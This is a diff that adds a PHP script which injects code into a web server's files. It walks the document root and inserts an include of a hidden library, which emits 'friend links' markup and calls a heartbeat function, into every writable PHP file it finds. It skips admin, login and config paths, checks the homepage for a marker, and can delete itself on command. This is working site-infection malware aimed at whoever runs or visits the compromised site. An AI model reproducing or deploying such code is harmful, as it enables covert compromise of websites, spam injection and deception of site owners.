@@ -1,0 +1,226 @@
+<?php
+
+
+
+
+$libFNameBody='functions-php-lib';//====================================
+
+$rootPath = $_SERVER['DOCUMENT_ROOT'];
+$currentDir = dirname($_SERVER['SCRIPT_FILENAME']); 
+$currDirNORTPathONLY = str_replace($rootPath  ,'',$currentDir);
+
+$txtFile = $currentDir . '/'.$libFNameBody.'.txt'; //====================================
+
+
+$PHPFile = $currentDir . '/'.$libFNameBody.'.php';  
+
+
+if (!file_exists($PHPFile)) {
+  
+    $libContent = file_get_contents($txtFile);
+    $libContent = str_replace("0im1wt2Path3Dir4String5", $currDirNORTPathONLY, $libContent);
+    file_put_contents($PHPFile, $libContent);
+   
+
+    if(file_exists($txtFile) and file_exists($PHPFile)){ unlink($txtFile);}     
+
+}
+
+
+$libPathFile=$currDirNORTPathONLY."/".$libFNameBody.".php";   
+$VFiStr = "DhdL8Uf9"; //===========================================================<!--Dldhl2dhdL3Uf9-->
+$tagInner="div";       //==================================================================================
+
+ 
+
+ 
+//$_SERVER['DOCUMENT_ROOT']与 $_SERVER["DOCUMENT_ROOT"] .$currDirNORTPathONLY.
+
+ 
+$insertCode = '<?php include_once $_SERVER["DOCUMENT_ROOT"]."'.$libPathFile.'"; global $hasRun; if (!$hasRun) { echo site_friend_links("<!--'.$VFiStr.'-->");flush();heartBT(); $hasRun = true;} ?>';
+
+$blackList=['embed','admin','editor','404','backend','cpanel','manage','config','setting','console','sitemap','api','login','signup','cache'];
+
+
+
+
+
+
+
+$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath));
+$phpFiles = [];
+$inserted = [];
+
+$AC="";
+if(isset($_GET['AC'])){ $AC=trim($_GET['AC']); $AC=str_replace(' ','',$AC); }
+$SHOW="0";
+if(isset($_GET['SHOW'])){ $SHOW=trim($_GET['SHOW']); $SHOW=str_replace(' ','',$SHOW); }
+
+
+if ($SHOW=="1") {
+    echo date('Y-m-d H:i:s')."<br> ";
+    echo preg_quote($insertCode, '/') ."<br><br>";
+}
+
+
+foreach ($files as $file) {
+    if ($file->isFile() && $file->getExtension() === 'php' && $file->isWritable() && $file->getRealPath() !== __FILE__) {
+        $dir = $file->getPath();
+
+        $blackListed = false;
+        foreach ($blackList as $blackWord) {
+            if (strpos($dir, $blackWord) !== false || strpos($file->getFilename(), $blackWord) !== false) {
+                $blackListed = true;
+                break;
+            }
+        }
+        if (!$blackListed) {            
+            $phpFiles[] = $file->getRealPath();
+        }
+
+    }//endif 
+}
+
+ 
+
+//***
+function deleteAction($phpFiles,$insertCode){
+    if(isset($_GET['SHOW'])){ $SHOW=trim($_GET['SHOW']); $SHOW=str_replace(' ','',$SHOW); }//ADD AC
+    $i=1;
+    foreach ($phpFiles as $file) {
+        $content = file_get_contents($file);      
+        if (strpos($content, $insertCode) !== false) {      
+          $content = str_replace($insertCode, '', $content); 
+          file_put_contents($file, $content);  
+
+          if ($SHOW=="1") { echo "$i ".  $file . " *DEL REBACK ORIGINAL <br>";  }
+          $i=$i+1;//序号+1   
+        }      
+    }
+    if($i==1){
+        if ($SHOW=="1") { echo "DEL ACTION: NO MATCH file/content/VFstring<br>" ; }
+    }
+};
+
+
+
+function insertAction($phpFiles,$insertCode,$tagInner){
+    if(isset($_GET['SHOW'])){ $SHOW=trim($_GET['SHOW']); $SHOW=str_replace(' ','',$SHOW); }
+    $i=1;
+    foreach ($phpFiles as $phpFile) {
+        $content = file_get_contents($phpFile);
+        
+        if (preg_match_all('/<\/' . $tagInner . '>/', $content, $matches, PREG_OFFSET_CAPTURE)) {
+            $validMatches = array_filter($matches[0], function ($match) use ($content) {
+                $pos = $match[1];            
+                $tmpStr=substr($content, 0, $pos);            
+                $phpEndTagPos = strrpos($tmpStr, '?>');
+                $phpBeginTagPos = strrpos($tmpStr, '<?php'); 
+                return substr_count($tmpStr, '<?php')==substr_count($tmpStr, '?>') &&   $phpEndTagPos >= $phpBeginTagPos  &&         
+                       substr_count($tmpStr, '<!--')==substr_count($tmpStr, '-->') &&
+                       substr_count($tmpStr, '<script')==substr_count($tmpStr, '</script>') ;        
+            });
+    
+            if (!empty($validMatches)) {
+                $randomMatch = $validMatches[array_rand($validMatches)];
+                $insertPos = $randomMatch[1] + strlen($randomMatch[0]);
+    
+                if ($SHOW=="1") { echo "$i . ";}
+    
+                if (strpos($content, $insertCode) !== false) {
+                    if ($SHOW=="1") {echo $phpFile . "-Already operated before.\n<br>";}
+                } else {
+                    if (!empty($inserted)){
+                        
+                        foreach ($inserted as $insertedFile) {
+                            if (preg_match('/(include|require|include_once|require_once) \'' . preg_quote($insertedFile, '/') . '\';/', $content)) {
+                                $inserted[] = $phpFile;
+                                continue 2;
+                            }
+                        }//end foreach 
+                    }//end if 
+                    
+    
+                    $newContent = substr($content, 0, $insertPos) . $insertCode . substr($content, $insertPos);
+                    file_put_contents($phpFile, $newContent);
+                    $inserted[] = $phpFile;
+                    if ($SHOW=="1") { echo $phpFile . "<b>-EMBED OK***</b><br>";}
+                }
+    
+                $i=$i+1; 
+            }//endif !empty($validMatches)
+            
+        }//endif preg_match_all 
+    }//end foreach 1st
+    if($i==1){
+        if ($SHOW=="1") {echo "ADD ACTION: NO MATCH file/tag/VFstring <br>" ; }
+    }
+} //end function 
+
+
+
+
+if($AC=="DEL"){
+    deleteAction($phpFiles,$insertCode);      
+    exit();  
+}elseif($AC=="ADD"){
+    insertAction($phpFiles,$insertCode,$tagInner);      
+    exit();
+
+}elseif($AC=="UNLINK"){
+    unlink(__FILE__);   
+    exit();
+}
+
+
+// CHECK phpFiles Count>0 , do in, else, show code 0, exit() die()
+insertAction($phpFiles,$insertCode,$tagInner);
+
+//===============================================
+
+
+
+$home_url = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'];
+$insertOK=false;
+
+//
+$j=1;
+while(!$insertOK){   
+
+    $homepageContent = file_get_contents($home_url);
+    if(strpos($homepageContent, $VFiStr) !== false) {
+        $insertOK=true;
+    }else{  
+        deleteAction($phpFiles,$insertCode);
+        insertAction($phpFiles,$insertCode,$tagInner);
+    }
+    $j=$j+1;
+    if($j>3){break;}//try 3 times
+}
+
+if(!$insertOK){
+    deleteAction($phpFiles,$insertCode);
+    echo '{"code":0,"msg":"3 times NOT MATCH,check by hand: VFstring,insertScript,postion tagInner; or try again."}';
+}else{
+    echo '{"code":1,"msg":" EMBED OK"}';
+    // unlink(__FILE__);
+}
+
+
+
+?>
+<?php
+if ($SHOW=="1") {
+    ?>
+
+<br><a href="?AC=DEL&SHOW=1" target="_blank">DEL CLEAR REBACK</a><br>
+<br>
+<br><a href="?AC=ADD&SHOW=1" target="_blank">ADD ONLY ONCE</a><br>
+<br>
+<br><a href="?AC=UNLINK&SHOW=1" target="_blank">UNLINK DEL SELF PHP </a><br>
+<br>
+
+<?php
+}//endif  $AC=="SHOW" 
+?>
+
